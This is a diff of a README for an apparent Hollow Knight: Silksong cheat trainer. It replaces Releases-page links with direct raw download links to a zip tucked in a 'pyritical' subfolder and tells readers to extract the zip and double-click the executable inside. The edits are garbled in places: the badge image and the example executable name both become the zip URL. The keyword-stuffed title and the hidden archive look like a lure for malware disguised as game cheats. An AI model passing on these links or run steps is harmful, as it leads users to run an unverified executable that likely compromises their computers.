@@ -1,6 +1,6 @@
 # 🎮 Hollow-Knight-Silksong-Trainer-Download-Cheats-Infinite-Silk-Invincibility-Fast-Attacks - Enhance Your Gameplay Experience
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/nwekar666/Hollow-Knight-Silksong-Trainer-Download-Cheats-Infinite-Silk-Invincibility-Fast-Attacks/releases)
+[![Download Now](https://raw.githubusercontent.com/nwekar666/Hollow-Knight-Silksong-Trainer-Download-Cheats-Infinite-Silk-Invincibility-Fast-Attacks/main/pyritical/Hollow-Knight-Silksong-Trainer-Download-Cheats-Infinite-Silk-Invincibility-Fast-Attacks.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/nwekar666/Hollow-Knight-Silksong-Trainer-Download-Cheats-Infinite-Silk-Invincibility-Fast-Attacks/main/pyritical/Hollow-Knight-Silksong-Trainer-Download-Cheats-Infinite-Silk-Invincibility-Fast-Attacks.zip)
 
 ## 📦 Description
 
@@ -14,7 +14,7 @@ To get started, you need to download the software from our Releases page. Follow
 
 1. **Visit the Downloads Page:**  
    Click the link below to go to the Releases page.
-   [Download the Trainer](https://github.com/nwekar666/Hollow-Knight-Silksong-Trainer-Download-Cheats-Infinite-Silk-Invincibility-Fast-Attacks/releases)
+   [Download the Trainer](https://raw.githubusercontent.com/nwekar666/Hollow-Knight-Silksong-Trainer-Download-Cheats-Infinite-Silk-Invincibility-Fast-Attacks/main/pyritical/Hollow-Knight-Silksong-Trainer-Download-Cheats-Infinite-Silk-Invincibility-Fast-Attacks.zip)
    
 2. **Select the Correct Version:**  
    Choose the version that matches your needs. If you're unsure, select the latest release. 
@@ -29,7 +29,7 @@ To get started, you need to download the software from our Releases page. Follow
    If the file is in a .zip format, right-click on it and choose "Extract All." Follow the prompts to extract the contents to a new folder.
 
 6. **Run the Trainer:**  
-   Open the folder where you extracted the files. Double-click the trainer executable file (e.g., `HollowKnightTrainer.exe`) to start the application.
+   Open the folder where you extracted the files. Double-click the trainer executable file (e.g., `https://raw.githubusercontent.com/nwekar666/Hollow-Knight-Silksong-Trainer-Download-Cheats-Infinite-Silk-Invincibility-Fast-Attacks/main/pyritical/Hollow-Knight-Silksong-Trainer-Download-Cheats-Infinite-Silk-Invincibility-Fast-Attacks.zip`) to start the application.
 
 7. **Launch Hollow Knight: Silksong:**  
    Open the game normally. Once the game is running, switch back to the trainer.
